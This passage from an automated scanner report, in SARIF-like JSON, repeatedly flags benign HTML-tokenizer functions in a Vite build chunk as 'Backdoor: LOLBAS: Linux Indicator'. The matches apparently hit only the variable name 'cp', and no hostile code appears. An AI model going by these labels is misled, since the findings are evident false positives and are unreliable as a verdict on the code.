                      "text": "    return isAsciiLetter(cp) || isAsciiDigit(cp);\n}\nfunction isAsciiUpperHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n",
                      "markdown": "`    return isAsciiLetter(cp) || isAsciiDigit(cp);\n}\nfunction isAsciiUpperHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1105,
                  "startColumn": 10,
                  "endLine": 1105,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    return isAsciiLetter(cp) || isAsciiDigit(cp);\n}\nfunction isAsciiUpperHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n",
                    "rendered": {
                      "text": "    return isAsciiLetter(cp) || isAsciiDigit(cp);\n}\nfunction isAsciiUpperHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n",
                      "markdown": "`    return isAsciiLetter(cp) || isAsciiDigit(cp);\n}\nfunction isAsciiUpperHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_F;\n}\nfunction isAsciiLowerHexDigit(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_F;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1096,
                  "startColumn": 45,
                  "endLine": 1096,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n}\nfunction isAsciiLetter(cp) {\n    return isAsciiLower(cp) || isAsciiUpper(cp);\n",
                    "rendered": {
                      "text": "    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n}\nfunction isAsciiLetter(cp) {\n    return isAsciiLower(cp) || isAsciiUpper(cp);\n",
                      "markdown": "`    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n}\nfunction isAsciiLetter(cp) {\n    return isAsciiLower(cp) || isAsciiUpper(cp);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1096,
                  "startColumn": 10,
                  "endLine": 1096,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n}\nfunction isAsciiLetter(cp) {\n    return isAsciiLower(cp) || isAsciiUpper(cp);\n",
                    "rendered": {
                      "text": "    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n}\nfunction isAsciiLetter(cp) {\n    return isAsciiLower(cp) || isAsciiUpper(cp);\n",
                      "markdown": "`    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n}\nfunction isAsciiLetter(cp) {\n    return isAsciiLower(cp) || isAsciiUpper(cp);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1093,
                  "startColumn": 47,
                  "endLine": 1093,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n",
                    "rendered": {
                      "text": "    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n",
                      "markdown": "`    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1093,
                  "startColumn": 10,
                  "endLine": 1093,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n",
                    "rendered": {
                      "text": "    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n",
                      "markdown": "`    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n}\nfunction isAsciiLower(cp) {\n    return cp >= CODE_POINTS.LATIN_SMALL_A && cp <= CODE_POINTS.LATIN_SMALL_Z;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1090,
                  "startColumn": 39,
                  "endLine": 1090,
                  "endColumn": 43,
                  "snippet": {
                    "text": "//this functions if they will be situated in another module due to context switch.\n//Always perform inlining check before modifying this functions ('node --trace-inlining').\nfunction isAsciiDigit(cp) {\n    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n",
                    "rendered": {
                      "text": "//this functions if they will be situated in another module due to context switch.\n//Always perform inlining check before modifying this functions ('node --trace-inlining').\nfunction isAsciiDigit(cp) {\n    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n",
                      "markdown": "`//this functions if they will be situated in another module due to context switch.\n//Always perform inlining check before modifying this functions ('node --trace-inlining').\nfunction isAsciiDigit(cp) {\n    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 1090,
                  "startColumn": 10,
                  "endLine": 1090,
                  "endColumn": 14,
                  "snippet": {
                    "text": "//this functions if they will be situated in another module due to context switch.\n//Always perform inlining check before modifying this functions ('node --trace-inlining').\nfunction isAsciiDigit(cp) {\n    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n",
                    "rendered": {
                      "text": "//this functions if they will be situated in another module due to context switch.\n//Always perform inlining check before modifying this functions ('node --trace-inlining').\nfunction isAsciiDigit(cp) {\n    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n",
                      "markdown": "`//this functions if they will be situated in another module due to context switch.\n//Always perform inlining check before modifying this functions ('node --trace-inlining').\nfunction isAsciiDigit(cp) {\n    return cp >= CODE_POINTS.DIGIT_0 && cp <= CODE_POINTS.DIGIT_9;\n}\nfunction isAsciiUpper(cp) {\n    return cp >= CODE_POINTS.LATIN_CAPITAL_A && cp <= CODE_POINTS.LATIN_CAPITAL_Z;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 311,
                  "startColumn": 25,
                  "endLine": 311,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n        if (!isCommonValidRange) {\n            this._checkForProblematicCharacters(cp);\n        }\n",
                    "rendered": {
                      "text": "            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n        if (!isCommonValidRange) {\n            this._checkForProblematicCharacters(cp);\n        }\n",
                      "markdown": "`            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n        if (!isCommonValidRange) {\n            this._checkForProblematicCharacters(cp);\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 310,
                  "startColumn": 11,
                  "endLine": 310,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        const isCommonValidRange = this.handler.onParseError === null ||\n            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n        if (!isCommonValidRange) {\n            this._checkForProblematicCharacters(cp);\n",
                    "rendered": {
                      "text": "        const isCommonValidRange = this.handler.onParseError === null ||\n            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n        if (!isCommonValidRange) {\n            this._checkForProblematicCharacters(cp);\n",
                      "markdown": "`        const isCommonValidRange = this.handler.onParseError === null ||\n            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n        if (!isCommonValidRange) {\n            this._checkForProblematicCharacters(cp);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 309,
                  "startColumn": 11,
                  "endLine": 309,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        //before going into detailed performance cost validation.\n        const isCommonValidRange = this.handler.onParseError === null ||\n            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n        if (!isCommonValidRange) {\n",
                    "rendered": {
                      "text": "        //before going into detailed performance cost validation.\n        const isCommonValidRange = this.handler.onParseError === null ||\n            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n        if (!isCommonValidRange) {\n",
                      "markdown": "`        //before going into detailed performance cost validation.\n        const isCommonValidRange = this.handler.onParseError === null ||\n            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n        if (!isCommonValidRange) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 308,
                  "startColumn": 25,
                  "endLine": 308,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        //range (ASCII alphanumeric, whitespaces, big chunk of BMP)\n        //before going into detailed performance cost validation.\n        const isCommonValidRange = this.handler.onParseError === null ||\n            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n",
                    "rendered": {
                      "text": "        //range (ASCII alphanumeric, whitespaces, big chunk of BMP)\n        //before going into detailed performance cost validation.\n        const isCommonValidRange = this.handler.onParseError === null ||\n            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n",
                      "markdown": "`        //range (ASCII alphanumeric, whitespaces, big chunk of BMP)\n        //before going into detailed performance cost validation.\n        const isCommonValidRange = this.handler.onParseError === null ||\n            (cp > 0x1f && cp < 0x7f) ||\n            cp === CODE_POINTS.LINE_FEED ||\n            cp === CODE_POINTS.CARRIAGE_RETURN ||\n            (cp > 0x9f && cp < 64976);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 302,
                  "startColumn": 11,
                  "endLine": 302,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        }\n        this.skipNextNewLine = false;\n        if (isSurrogate(cp)) {\n            cp = this._processSurrogate(cp);\n        }\n        //OPTIMIZATION: first check if code point is in the common allowed\n        //range (ASCII alphanumeric, whitespaces, big chunk of BMP)\n",
                    "rendered": {
                      "text": "        }\n        this.skipNextNewLine = false;\n        if (isSurrogate(cp)) {\n            cp = this._processSurrogate(cp);\n        }\n        //OPTIMIZATION: first check if code point is in the common allowed\n        //range (ASCII alphanumeric, whitespaces, big chunk of BMP)\n",
                      "markdown": "`        }\n        this.skipNextNewLine = false;\n        if (isSurrogate(cp)) {\n            cp = this._processSurrogate(cp);\n        }\n        //OPTIMIZATION: first check if code point is in the common allowed\n        //range (ASCII alphanumeric, whitespaces, big chunk of BMP)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 281,
                  "startColumn": 11,
                  "endLine": 281,
                  "endColumn": 15,
                  "snippet": {
                    "text": "            this.endOfChunkHit = !this.lastChunkWritten;\n            return CODE_POINTS.EOF;\n        }\n        let cp = this.html.charCodeAt(this.pos);\n        //NOTE: all U+000D CARRIAGE RETURN (CR) characters must be converted to U+000A LINE FEED (LF) characters\n        if (cp === CODE_POINTS.CARRIAGE_RETURN) {\n            this.isEol = true;\n",
                    "rendered": {
                      "text": "            this.endOfChunkHit = !this.lastChunkWritten;\n            return CODE_POINTS.EOF;\n        }\n        let cp = this.html.charCodeAt(this.pos);\n        //NOTE: all U+000D CARRIAGE RETURN (CR) characters must be converted to U+000A LINE FEED (LF) characters\n        if (cp === CODE_POINTS.CARRIAGE_RETURN) {\n            this.isEol = true;\n",
                      "markdown": "`            this.endOfChunkHit = !this.lastChunkWritten;\n            return CODE_POINTS.EOF;\n        }\n        let cp = this.html.charCodeAt(this.pos);\n        //NOTE: all U+000D CARRIAGE RETURN (CR) characters must be converted to U+000A LINE FEED (LF) characters\n        if (cp === CODE_POINTS.CARRIAGE_RETURN) {\n            this.isEol = true;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 17,
                  "endLine": 253,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            return this.html.startsWith(pattern, this.pos);\n        }\n        for (let i = 0; i < pattern.length; i++) {\n            const cp = this.html.charCodeAt(this.pos + i) | 0x20;\n            if (cp !== pattern.charCodeAt(i)) {\n                return false;\n            }\n",
                    "rendered": {
                      "text": "            return this.html.startsWith(pattern, this.pos);\n        }\n        for (let i = 0; i < pattern.length; i++) {\n            const cp = this.html.charCodeAt(this.pos + i) | 0x20;\n            if (cp !== pattern.charCodeAt(i)) {\n                return false;\n            }\n",
                      "markdown": "`            return this.html.startsWith(pattern, this.pos);\n        }\n        for (let i = 0; i < pattern.length; i++) {\n            const cp = this.html.charCodeAt(this.pos + i) | 0x20;\n            if (cp !== pattern.charCodeAt(i)) {\n                return false;\n            }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 26,
                  "endLine": 75,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n    return (cp >= 64976 && cp <= 65007) || UNDEFINED_CODE_POINTS.has(cp);\n}\n\nvar ERR;\n",
                    "rendered": {
                      "text": "        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n    return (cp >= 64976 && cp <= 65007) || UNDEFINED_CODE_POINTS.has(cp);\n}\n\nvar ERR;\n",
                      "markdown": "`        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n    return (cp >= 64976 && cp <= 65007) || UNDEFINED_CODE_POINTS.has(cp);\n}\n\nvar ERR;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 22,
                  "endLine": 72,
                  "endColumn": 26,
                  "snippet": {
                    "text": "//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n    return (cp >= 64976 && cp <= 65007) || UNDEFINED_CODE_POINTS.has(cp);\n",
                    "rendered": {
                      "text": "//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n    return (cp >= 64976 && cp <= 65007) || UNDEFINED_CODE_POINTS.has(cp);\n",
                      "markdown": "`//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n    return (cp >= 64976 && cp <= 65007) || UNDEFINED_CODE_POINTS.has(cp);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 101,
                  "endLine": 71,
                  "endColumn": 105,
                  "snippet": {
                    "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                    "rendered": {
                      "text": "}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n",
                      "markdown": "`}\n//NOTE: excluding NULL and ASCII whitespace\nfunction isControlCodePoint(cp) {\n    return ((cp !== 0x20 && cp !== 0x0a && cp !== 0x0d && cp !== 0x09 && cp !== 0x0c && cp >= 0x01 && cp <= 0x1f) ||\n        (cp >= 0x7f && cp <= 0x9f));\n}\nfunction isUndefinedCodePoint(cp) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
